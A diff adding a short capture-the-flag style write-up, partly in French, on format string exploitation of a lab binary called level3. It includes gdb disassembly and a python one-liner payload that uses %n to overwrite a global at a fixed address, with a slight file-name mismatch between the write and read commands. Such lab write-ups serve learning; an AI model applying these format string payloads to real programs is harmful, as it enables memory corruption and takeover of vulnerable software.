@@ -1,0 +1,24 @@
+This level introduce us to the format string exploitation
+
+A quoi sert %n dans printf() ?
+Posted on juillet 5, 2022
+by StackLima
+En C printf(), %n est un spécificateur de format spécial qui, au lieu d’imprimer quelque chose, oblige printf() à charger la variable pointée par l’argument correspondant avec une valeur égale au nombre de caractères qui ont été imprimés par printf() avant le occurrence de %n.
+
+https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
+
+
+when gdb the binary, we see theses lines
+
+=> 0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+   0x080484da <+54>:    mov    eax,ds:0x804988c
+   0x080484df <+59>:    cmp    eax,0x40
+
+
+eax is compare with 0x40 which is '64' in decimal, otherwise eax is set in hard by ds:0x804988 (which its value is 0x000000)
+si we have to use the format string exploitation to write inside a stack address with the %n flag
+
+
+python -c "import sys; sys.stdout.write('\x8c\x98\x04\x08' + 'A'*35 +  '%p%p%p' + '%n')" > /tmp/input
+
+cat /tmp/test - | ./level3
